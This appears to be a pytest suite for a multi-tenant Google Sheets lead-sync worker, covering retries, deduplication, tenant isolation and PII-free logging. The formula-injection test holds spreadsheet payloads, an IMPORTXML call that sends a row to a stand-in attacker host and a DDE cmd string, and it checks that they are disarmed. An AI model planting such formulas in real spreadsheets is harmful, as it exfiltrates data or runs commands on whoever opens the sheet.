"""Google Sheets sync — the OTHER half of D-23 (`outbound_webhooks.kind = 'google_sheets'`).

The webhook half shipped with a signed envelope, a retry ladder and a delivery log. The
sheets half is the same feature with a different transport, so these tests exist to hold
it to the SAME definition of "we delivered a lead" rather than a second, divergent one:

1. **One delivery log.** A sheets append lands in `webhook_deliveries(direction='out')`
   with the tenant's `endpoint_id`, exactly like a POST, so the delivery screen answers
   "did it reach my sheet?" without a support ticket.
2. **One retry ladder.** `arq.Retry`, the same `RETRY_BACKOFF_S`, the same
   `WORKER_MAX_TRIES`, the same exhausted alert.
3. **Idempotency comes from that log, not from a second mechanism.** A duplicate row in
   a document a human is reading cannot be un-seen; the delivery row is what prevents it.
4. **A missing credential REFUSES rather than pretending.** There is no Google service
   account in this repo and no vendor SDK; what ships is the seam, a dev sink, and a
   refusal that is visible on the client's own delivery screen.
5. **Hard rule 6.** A row carries a name and (on opt-in) a phone number. None of it
   reaches a log line.
6. **Hard rule 1.** The worker runs under the tenant's GUC and cannot see another
   tenant's endpoint or another tenant's delivery row.

Everything here runs against the CONSOLE DEV SINK or a recording fake — no credentials,
no network, no Google. That is deliberate: an adapter written against an API we cannot
call is worse than none, because it looks finished.

CONCURRENCY: every test mints its own tenant and touches no global row, so this file can
run beside the other suites on the shared Postgres.
"""

from __future__ import annotations

import json
import logging
import uuid
from typing import Any
from uuid import UUID

import pytest
from apps.api.admin import service as admin_service
from apps.api.core.logging import JsonFormatter
from apps.api.core.queue import WORKER_MAX_TRIES
from apps.api.core.settings import get_settings
from apps.api.db.base import uuid7
from apps.api.db.session import tenant_session, untenanted_session
from apps.api.integrations import models as integrations_models
from apps.api.integrations import service
from apps.workers import outbound_webhooks, sheets_sync
from apps.workers.outbound_webhooks import deliver_outbound_webhook
from apps.workers.sheets_sync import (
    AppendResult,
    AppendStatus,
    ConsoleSheetsTransport,
    SheetAppend,
    UnconfiguredSheetsTransport,
    get_sheets_transport,
)
from arq import Retry
from sqlalchemy import text

# A secrets-manager REFERENCE, which is all `secret_ref` may ever hold (DATA-MODEL §6).
# It is not a credential and cannot be turned into one — that is the point of the column.
CREDENTIAL_REF = "sm://calevate/local/tenants/test/google-service-account"

# A real-shaped Google spreadsheet id (44 url-safe chars). Names a document nobody owns.
SHEET_ID = "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms"
SHEET_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/edit#gid=0"

CALLER_E164 = "+919876500222"


# --------------------------------------------------------------------------------
# Seeding
# --------------------------------------------------------------------------------


async def _tenant_with_sheet(
    *,
    events: tuple[str, ...] = ("lead.created",),
    url: str | None = SHEET_URL,
    secret_ref: str | None = CREDENTIAL_REF,
    mapping: dict[str, Any] | None = None,
    active: bool = True,
) -> tuple[UUID, UUID]:
    created = await admin_service.create_organization(
        name="Sheet Clinic",
        slug=f"sheet-{uuid.uuid4().hex[:8]}",
        vertical_template="clinic",
        billing_email=None,
        language="te-IN",
        created_by=None,
    )
    tenant_id = UUID(str(created["id"]))
    endpoint_id = uuid7()
    async with tenant_session(tenant_id) as session:
        await session.execute(
            text(
                "INSERT INTO outbound_webhooks (id, tenant_id, kind, url, secret_ref, events, "
                "mapping, active, created_at, updated_at) VALUES (:id, :tid, 'google_sheets', "
                ":url, :secret, :events, CAST(:mapping AS jsonb), :active, now(), now())"
            ),
            {
                "id": endpoint_id,
                "tid": tenant_id,
                "url": url,
                "secret": secret_ref,
                "events": list(events),
                "mapping": json.dumps(mapping) if mapping is not None else None,
                "active": active,
            },
        )
    return tenant_id, endpoint_id


def _job_payload(tenant_id: UUID, endpoint_id: UUID, **over: Any) -> dict[str, Any]:
    payload: dict[str, Any] = {
        "tenant_id": str(tenant_id),
        "endpoint_id": str(endpoint_id),
        "event": "lead.created",
        "data": {
            "lead_id": str(uuid7()),
            "phone": "[redacted]",
            "name": "Ravi Kumar",
            "source": "webhook",
            "status": "new",
        },
        "delivery_id": str(uuid7()),
    }
    payload.update(over)
    return payload


class _Recorder:
    """A stand-in Sheets adapter. Captures the exact append we would have made."""

    name = "recorder"

    def __init__(self, result: AppendResult | None = None) -> None:
        self.result = result or AppendResult(AppendStatus.APPENDED)
        self.appends: list[SheetAppend] = []

    async def append(self, request: SheetAppend) -> AppendResult:
        self.appends.append(request)
        return self.result


def _use(monkeypatch: pytest.MonkeyPatch, transport: _Recorder | None = None) -> _Recorder:
    sink = transport or _Recorder()
    monkeypatch.setattr(sheets_sync, "get_sheets_transport", lambda: sink)
    return sink


def _capture_alerts(monkeypatch: pytest.MonkeyPatch) -> list[tuple[str, str, Any]]:
    fired: list[tuple[str, str, Any]] = []

    def _record(stage: str, code: str, **kwargs: Any) -> None:
        fired.append((stage, code, kwargs.get("detail")))

    monkeypatch.setattr(outbound_webhooks, "alert", _record)
    return fired


async def _delivery(tenant_id: UUID, delivery_id: UUID) -> tuple[Any, ...] | None:
    async with tenant_session(tenant_id) as session:
        row = (
            await session.execute(
                text(
                    "SELECT status, attempts, source, event_type, endpoint_id "
                    "FROM webhook_deliveries WHERE id = :id"
                ),
                {"id": delivery_id},
            )
        ).first()
    return tuple(row) if row is not None else None


# --------------------------------------------------------------------------------
# 1. The transport seam: a dev sink that needs nothing, and no invented vendor
# --------------------------------------------------------------------------------


async def test_local_without_credentials_uses_the_dev_sink(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(get_settings(), "app_env", "local")
    transport = get_sheets_transport()
    assert isinstance(transport, ConsoleSheetsTransport)
    result = await transport.append(
        SheetAppend(
            spreadsheet_id=SHEET_ID,
            worksheet="Leads",
            header=("Lead",),
            values=("x",),
            credential_ref=CREDENTIAL_REF,
        )
    )
    assert result.appended is True, "it really did append — to a terminal"


async def test_a_real_environment_refuses_rather_than_pretending(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """No Google service account exists and no adapter was written against one. Outside
    local the transport must fail LOUDLY: a silent no-op looks exactly like a working
    integration, which is the failure this whole module exists to prevent."""
    monkeypatch.setattr(get_settings(), "app_env", "prod")
    transport = get_sheets_transport()
    assert isinstance(transport, UnconfiguredSheetsTransport)
    result = await transport.append(
        SheetAppend(
            spreadsheet_id=SHEET_ID,
            worksheet="Leads",
            header=("Lead",),
            values=("x",),
            credential_ref=CREDENTIAL_REF,
        )
    )
    assert result.appended is False
    assert result.retryable is False, "a missing service account is not a blip"
    assert result.reason == sheets_sync.NO_CREDENTIALS_REASON


def test_the_append_is_raw_so_a_cell_is_never_evaluated() -> None:
    """`valueInputOption=USER_ENTERED` would make every cell a potential formula. The
    contract an adapter must honour is a module constant, not a comment."""
    assert sheets_sync.VALUE_INPUT_OPTION == "RAW"


# --------------------------------------------------------------------------------
# 2. What the config row means
# --------------------------------------------------------------------------------


def test_a_sheet_url_or_a_bare_id_both_resolve() -> None:
    assert service.parse_spreadsheet_ref(SHEET_URL) == SHEET_ID
    assert service.parse_spreadsheet_ref(f"  {SHEET_ID}  ") == SHEET_ID
    assert service.parse_spreadsheet_ref(f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/") == (
        SHEET_ID
    )


def test_anything_that_is_not_a_sheet_resolves_to_nothing() -> None:
    """We would rather refuse than append a client's leads into a document we guessed."""
    for candidate in (None, "", "   ", "https://evil.example/steal", "not-a-sheet", "1234"):
        assert service.parse_spreadsheet_ref(candidate) is None


async def test_the_column_order_survives_a_round_trip_through_jsonb() -> None:
    """THE trap in this feature. `mapping` is JSONB, and Postgres does NOT preserve
    object key order — it stores keys sorted by length then bytes. So a column order
    expressed as object keys comes back scrambled, and every appended row would land
    under different headings than the last.

    The order therefore lives in a JSON ARRAY, which jsonb does preserve. This test
    asserts both halves: the array survives, and the object does not (so nobody
    "simplifies" it back).
    """
    columns = ["status", "lead_id", "name", "a_very_long_field_name", "phone"]
    tenant_id, endpoint_id = await _tenant_with_sheet(
        mapping={"columns": columns, "scrambled": {c: c for c in columns}}
    )
    # Read under the tenant's GUC: `outbound_webhooks` is FORCE-RLS'd, so an untenanted
    # read of a config row is zero rows by design (hard rule 1).
    async with tenant_session(tenant_id) as session:
        stored = (
            await session.execute(
                text("SELECT mapping FROM outbound_webhooks WHERE id = :id"), {"id": endpoint_id}
            )
        ).scalar_one()

    assert list(stored["columns"]) == columns, "a JSON array keeps its order"
    assert list(stored["scrambled"]) != columns, (
        "object keys do NOT keep their order — this is why `columns` is a list"
    )
    assert service.sheet_columns("lead.created", stored) == tuple(columns)


def test_an_event_with_no_declared_columns_is_refused_rather_than_guessed() -> None:
    """Inferring the column order from THIS row's keys means the next row — with one
    field missing — silently shifts every value one column left. A spreadsheet has no
    per-row schema, so a guess is unrecoverable.

    The specimen used to be `campaign.completed`, which had no published payload shape.
    It has one now — it has a producer — so this asserts the property directly: an event
    NOBODY declares columns for gets an empty tuple rather than a guess, and every event
    a client can subscribe to has a layout. That second line is the stronger claim and it
    is the one `campaign.completed` used to fail: an event on the endpoint form with no
    entry here is a Sheets subscription refused at creation.
    """
    assert service.sheet_columns("no.such.event", {}) == ()
    for event in service.EVENT_TYPES:
        assert service.sheet_columns(event, {}), f"{event} is subscribable and unwritable"


# --------------------------------------------------------------------------------
# 3. The row itself
# --------------------------------------------------------------------------------


def test_the_header_renames_our_fields_and_the_delivery_id_is_always_last() -> None:
    columns = ("lead_id", "name")
    header = service.sheet_header(columns, {"headers": {"lead_id": "Lead Ref"}})
    assert header == ["Lead Ref", "name", service.SHEET_DELIVERY_HEADER]


def test_every_row_carries_its_delivery_id() -> None:
    """The same id as `X-Calevate-Delivery` on the webhook side and the same id as the
    forensic row. It is what lets a human — or a future adapter closing the crash
    window — ask "is this row already in the sheet?"."""
    delivery_id = uuid7()
    row = service.sheet_row({"lead_id": "L1", "name": "Ravi"}, ("lead_id", "name"), delivery_id)
    assert row == ["L1", "Ravi", str(delivery_id)]


def test_a_missing_field_is_an_empty_cell_not_the_word_none() -> None:
    row = service.sheet_row({"lead_id": "L1"}, ("lead_id", "outcome", "duration_s"), uuid7())
    assert row[1] == "" and row[2] == ""
    assert "None" not in row


def test_values_become_cells_without_python_syntax_leaking_in() -> None:
    row = service.sheet_row(
        {"n": 42, "flag": True, "off": False, "tags": ["a", "b"]},
        ("n", "flag", "off", "tags"),
        uuid7(),
    )
    assert row[:4] == ["42", "true", "false", '["a","b"]']


def test_a_formula_in_a_callers_name_cannot_execute_in_the_clients_sheet() -> None:
    """A lead's name comes from a caller or a web form — it is attacker-controlled text
    that a human then opens in Google Sheets. `=IMPORTXML(...)` in a cell exfiltrates
    the row to whoever wrote the name. Neutralised with the leading apostrophe Sheets
    uses to mean "this is text" (it is not shown in the rendered cell), on top of the
    RAW input option."""
    hostile = {
        "a": '=IMPORTXML("https://evil.example/?x="&A1,"//x")',
        "b": "+919876500222",
        "c": "-2+3+cmd|' /C calc'!A0",
        "d": "@SUM(A1:A9)",
        "e": "\tinjected",
    }
    row = service.sheet_row(hostile, ("a", "b", "c", "d", "e"), uuid7())
    for cell in row[:5]:
        assert cell.startswith("'"), f"{cell!r} would be evaluated by a spreadsheet"
    assert "IMPORTXML" in row[0], "the value is preserved, only disarmed"
    assert row[1] == "'+919876500222", "and a phone number is still readable"


# --------------------------------------------------------------------------------
# 4. Fan-out: a sheets endpoint is an endpoint
# --------------------------------------------------------------------------------


async def test_a_sheets_endpoint_is_fanned_out_like_a_webhook_endpoint() -> None:
    tenant_id, endpoint_id = await _tenant_with_sheet()
    async with tenant_session(tenant_id) as session:
        fanned = await service.enqueue_event(
            session, tenant_id=tenant_id, event="lead.created", data={"lead_id": "1"}
        )

    async with untenanted_session() as session:
        rows = (
            (
                await session.execute(
                    text(
                        "SELECT payload FROM outbox_messages "
                        "WHERE job = 'deliver_outbound_webhook' "
                        "AND payload->>'tenant_id' = :t"
                    ),
                    {"t": str(tenant_id)},
                )
            )
            .scalars()
            .all()
        )

    assert fanned == 1, "the sheet is a subscriber like any other"
    assert len(rows) == 1
    assert rows[0]["endpoint_id"] == str(endpoint_id)
    assert rows[0]["delivery_id"], "minted at enqueue, so a retry reuses it"


async def test_an_inactive_sheet_is_never_enqueued() -> None:
    tenant_id, _ = await _tenant_with_sheet(active=False)
    async with tenant_session(tenant_id) as session:
        assert (
            await service.enqueue_event(
                session, tenant_id=tenant_id, event="lead.created", data={"lead_id": "1"}
            )
            == 0
        )


async def test_a_phone_reaches_the_sheet_masked_unless_this_endpoint_opted_in() -> None:
    """The per-endpoint opt-in is the SAME one the webhook path uses — masking happens
    once, at the fan-out, because that is the last point that knows which endpoint a
    payload is for."""
    masked_tenant, _ = await _tenant_with_sheet()
    raw_tenant, _ = await _tenant_with_sheet(mapping={"include_raw_phone": True})

    for tenant_id in (masked_tenant, raw_tenant):
        async with tenant_session(tenant_id) as session:
            await service.enqueue_event(
                session,
                tenant_id=tenant_id,
                event="lead.created",
                data={"lead_id": "1", "phone": CALLER_E164},
            )

    async def _queued_phone(tenant_id: UUID) -> str:
        async with untenanted_session() as session:
            payload = (
                await session.execute(
                    text(
                        "SELECT payload FROM outbox_messages WHERE payload->>'tenant_id' = :t "
                        "AND job = 'deliver_outbound_webhook'"
                    ),
                    {"t": str(tenant_id)},
                )
            ).scalar_one()
        return str(payload["data"]["phone"])

    assert CALLER_E164 not in await _queued_phone(masked_tenant)
    assert await _queued_phone(raw_tenant) == CALLER_E164, "the opt-in is a real opt-in"


def test_every_endpoint_kind_the_schema_allows_has_a_delivery_path() -> None:
    """The gap this module closes, pinned as a rule rather than an example: a kind the
    CHECK constraint accepts but nothing delivers is an integration that silently never
    fires. Adding a kind to `OUTBOUND_KINDS` now fails here until it has a path."""
    assert set(service.DELIVERABLE_KINDS) == set(integrations_models.OUTBOUND_KINDS)


# --------------------------------------------------------------------------------
# 5. Delivery — one log, one ladder, one definition of "delivered"
# --------------------------------------------------------------------------------


async def test_an_appended_row_lands_in_the_same_delivery_log_as_a_webhook(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    tenant_id, endpoint_id = await _tenant_with_sheet(mapping={"worksheet": "Enquiries"})
    sink = _use(monkeypatch)
    payload = _job_payload(tenant_id, endpoint_id)

    outcome = await deliver_outbound_webhook({"job_try": 1}, payload)

    assert outcome == "delivered via sheets"
    assert len(sink.appends) == 1
    append = sink.appends[0]
    assert append.spreadsheet_id == SHEET_ID
    assert append.worksheet == "Enquiries"
    assert append.credential_ref == CREDENTIAL_REF
    assert list(append.values)[-1] == payload["delivery_id"]

    row = await _delivery(tenant_id, UUID(payload["delivery_id"]))
    assert row is not None
    status, attempts, source, event_type, logged_endpoint = row
    assert (status, attempts, source, event_type) == ("delivered", 1, "sheets", "lead.created")
    assert logged_endpoint == endpoint_id, "scoped to the tenant's own endpoint"


async def test_a_refused_sheet_is_visible_on_the_clients_own_delivery_screen(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The whole point of this milestone: honest instead of silent.

    Run against the REAL handler behind `GET /v1/integrations/deliveries` rather than a
    copy of its SQL, because a copy would keep passing the day the route stops scoping
    the way it does. The route filters by direction and by the tenant's own endpoint ids
    and NOT by kind, so a sheets refusal shows up beside the webhook deliveries with
    `status='failed'` — which is how a client learns their integration is not working
    without opening a support ticket.
    """
    from apps.api.integrations.routes import list_deliveries

    tenant_id, endpoint_id = await _tenant_with_sheet(secret_ref=None)
    _use(monkeypatch)
    _capture_alerts(monkeypatch)
    payload = _job_payload(tenant_id, endpoint_id)

    assert await deliver_outbound_webhook({"job_try": 1}, payload) == "rejected no_credential_ref"

    async with tenant_session(tenant_id) as session:
        visible = await list_deliveries(session, limit=50, _=None)  # type: ignore[arg-type]

    mine = [row for row in visible if row.id == UUID(payload["delivery_id"])]
    assert len(mine) == 1, "the client can see that their sheet was not written"
    assert mine[0].status == "failed"
    assert mine[0].event_type == "lead.created"


async def test_the_same_delivery_is_never_appended_twice(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A duplicate row in a document a human is reading cannot be un-seen, and a
    spreadsheet cannot deduplicate for us. The delivery log is the mechanism — the same
    one the forensic screen reads — not a second bespoke one."""
    tenant_id, endpoint_id = await _tenant_with_sheet()
    sink = _use(monkeypatch)
    payload = _job_payload(tenant_id, endpoint_id)

    first = await deliver_outbound_webhook({"job_try": 1}, payload)
    second = await deliver_outbound_webhook({"job_try": 1}, payload)

    assert (first, second) == ("delivered via sheets", "duplicate")
    assert len(sink.appends) == 1, "the second run must not reach the transport"


async def test_a_failed_append_is_retried_and_the_retry_really_appends(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The trap in any dedupe: if a recorded ATTEMPT counted as delivered, the ladder
    would be decorative. Only `delivered` blocks the retry."""
    tenant_id, endpoint_id = await _tenant_with_sheet()
    _use(monkeypatch, _Recorder(AppendResult(AppendStatus.TRANSPORT_FAILED, "sheets_unavailable")))
    _capture_alerts(monkeypatch)
    payload = _job_payload(tenant_id, endpoint_id)

    with pytest.raises(Retry):
        await deliver_outbound_webhook({"job_try": 1}, payload)

    row = await _delivery(tenant_id, UUID(payload["delivery_id"]))
    assert row is not None and row[0] == "failed"

    succeeding = _use(monkeypatch)
    assert await deliver_outbound_webhook({"job_try": 2}, payload) == "delivered via sheets"
    assert len(succeeding.appends) == 1, "the retry must reach the sheet again"

    row = await _delivery(tenant_id, UUID(payload["delivery_id"]))
    assert row is not None and row[:2] == ("delivered", 2), "one row per delivery, not per attempt"


async def test_the_last_try_gives_up_loudly(monkeypatch: pytest.MonkeyPatch) -> None:
    tenant_id, endpoint_id = await _tenant_with_sheet()
    _use(monkeypatch, _Recorder(AppendResult(AppendStatus.TRANSPORT_FAILED, "sheets_unavailable")))
    fired = _capture_alerts(monkeypatch)
    payload = _job_payload(tenant_id, endpoint_id)

    outcome = await deliver_outbound_webhook({"job_try": WORKER_MAX_TRIES}, payload)

    assert outcome == f"exhausted after {WORKER_MAX_TRIES}"
    assert [(stage, code) for stage, code, _ in fired] == [
        ("WORKER_DELIVERY", "outbound_webhook_exhausted")
    ]
    assert "sheets" in (fired[0][2] or ""), "the alert says which integration broke"


async def test_a_sheet_with_no_credential_reference_refuses_visibly(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The honest state of this feature. `secret_ref` holds a secrets-manager reference
    and nothing else; without one there is no way to reach the client's sheet, so the
    delivery is REFUSED — recorded `failed` on their own delivery screen and alerted —
    rather than retried three times or, worse, dropped in silence."""
    tenant_id, endpoint_id = await _tenant_with_sheet(secret_ref=None)
    sink = _use(monkeypatch)
    fired = _capture_alerts(monkeypatch)
    payload = _job_payload(tenant_id, endpoint_id)

    outcome = await deliver_outbound_webhook({"job_try": 1}, payload)

    assert outcome == "rejected no_credential_ref"
    assert sink.appends == [], "we do not call a vendor to discover we have no key"
    row = await _delivery(tenant_id, UUID(payload["delivery_id"]))
    assert row is not None and row[0] == "failed"
    assert [code for _s, code, _d in fired] == ["outbound_webhook_exhausted"]
    assert "permanent" in (fired[0][2] or "")


async def test_a_sheet_whose_url_is_not_a_sheet_refuses_permanently(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    tenant_id, endpoint_id = await _tenant_with_sheet(url="https://example.com/not-a-sheet")
    sink = _use(monkeypatch)
    _capture_alerts(monkeypatch)

    outcome = await deliver_outbound_webhook({"job_try": 1}, _job_payload(tenant_id, endpoint_id))
    assert outcome == "rejected no_spreadsheet_configured"
    assert sink.appends == []


async def test_an_event_with_no_column_order_refuses_instead_of_guessing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The DELIVERY-time half of the refusal `sheets_endpoint_test` pins at
    configuration time, and its column order is monkeypatched away for the same reason:
    `campaign.completed` gained a producer and therefore a layout, so no subscribable
    event is without one today. The next one added without a layout arrives in exactly
    the state this constructs, and lands on exactly this branch."""
    tenant_id, endpoint_id = await _tenant_with_sheet(events=("campaign.completed",))
    sink = _use(monkeypatch)
    _capture_alerts(monkeypatch)
    monkeypatch.delitem(service.DEFAULT_SHEET_COLUMNS, "campaign.completed")

    outcome = await deliver_outbound_webhook(
        {"job_try": 1},
        _job_payload(tenant_id, endpoint_id, event="campaign.completed", data={"campaign_id": "1"}),
    )
    assert outcome == "rejected no_column_order:campaign.completed"
    assert sink.appends == []


async def test_a_deactivated_sheet_is_skipped_not_retried_forever(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    tenant_id, endpoint_id = await _tenant_with_sheet(active=False)
    sink = _use(monkeypatch)
    payload = _job_payload(tenant_id, endpoint_id)

    outcome = await deliver_outbound_webhook({"job_try": 1}, payload)

    assert outcome == "endpoint_inactive"
    assert sink.appends == []
    row = await _delivery(tenant_id, UUID(payload["delivery_id"]))
    assert row is not None and row[0] == "skipped"


# --------------------------------------------------------------------------------
# 6. Hard rule 1 — the worker never reaches across tenants
# --------------------------------------------------------------------------------


@pytest.mark.rls
async def test_another_tenants_sheet_is_invisible_to_this_worker(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The job runs under one tenant's GUC. Handed a neighbour's endpoint id — a
    corrupted payload, a copy-paste in a replay tool — it must find nothing rather than
    append that neighbour's lead into this client's sheet."""
    _owner, owner_endpoint = await _tenant_with_sheet()
    intruder, _ = await _tenant_with_sheet()
    sink = _use(monkeypatch)

    outcome = await deliver_outbound_webhook({"job_try": 1}, _job_payload(intruder, owner_endpoint))

    assert outcome == "endpoint_inactive", "RLS returned zero rows, so there is nothing to send"
    assert sink.appends == []


@pytest.mark.rls
async def test_a_delivery_row_is_only_visible_through_the_tenants_own_endpoints(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """`webhook_deliveries` has no RLS policy of its own (engine events arrive before a
    tenant is known), so the dedupe read MUST scope through `outbound_webhooks`. If it
    did not, one tenant's delivered row could suppress another tenant's append."""
    tenant_a, endpoint_a = await _tenant_with_sheet()
    tenant_b, _endpoint_b = await _tenant_with_sheet()
    _use(monkeypatch)
    payload = _job_payload(tenant_a, endpoint_a)
    assert await deliver_outbound_webhook({"job_try": 1}, payload) == "delivered via sheets"

    delivery_id = UUID(payload["delivery_id"])
    async with tenant_session(tenant_a) as session:
        assert await service.delivery_status(session, delivery_id) == "delivered"
    async with tenant_session(tenant_b) as session:
        assert await service.delivery_status(session, delivery_id) is None


# --------------------------------------------------------------------------------
# 7. Hard rule 6 — a row is full of PII and none of it reaches a log
# --------------------------------------------------------------------------------


async def test_no_lead_data_reaches_the_logs(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    """Asserted through the real `JsonFormatter`, because that is what production
    writes: a record whose extras look clean can still stringify a row into `msg`."""
    tenant_id, endpoint_id = await _tenant_with_sheet(mapping={"include_raw_phone": True})
    _use(monkeypatch)
    _capture_alerts(monkeypatch)
    formatter = JsonFormatter()

    payload = _job_payload(tenant_id, endpoint_id)
    payload["data"] = {"lead_id": payload["data"]["lead_id"], "phone": CALLER_E164, "name": "Priya"}

    with caplog.at_level(logging.DEBUG):
        assert await deliver_outbound_webhook({"job_try": 1}, payload) == "delivered via sheets"
        # ...and the refusal path, which is where a "helpful" debug line lands.
        broken_tenant, broken_endpoint = await _tenant_with_sheet(secret_ref=None)
        broken = _job_payload(broken_tenant, broken_endpoint)
        broken["data"] = {"phone": CALLER_E164, "name": "Priya", "lead_id": str(uuid7())}
        await deliver_outbound_webhook({"job_try": 1}, broken)

    rendered = "\n".join(formatter.format(record) for record in caplog.records)
    assert CALLER_E164 not in rendered
    assert CALLER_E164.lstrip("+") not in rendered
    assert "Priya" not in rendered


async def test_the_console_sink_logs_the_shape_not_the_row(
    caplog: pytest.LogCaptureFixture,
) -> None:
    formatter = JsonFormatter()
    with caplog.at_level(logging.DEBUG):
        result = await ConsoleSheetsTransport().append(
            SheetAppend(
                spreadsheet_id=SHEET_ID,
                worksheet="Leads",
                header=("Lead", "Name", "Phone"),
                values=("L1", "Priya", CALLER_E164),
                credential_ref=CREDENTIAL_REF,
            )
        )
    assert result.appended is True
    rendered = "\n".join(formatter.format(record) for record in caplog.records)
    assert "Priya" not in rendered and CALLER_E164 not in rendered
    assert "Leads" in rendered, "the worksheet and the cell count are the useful part"
    assert CREDENTIAL_REF not in rendered, "not even the reference to the credential"
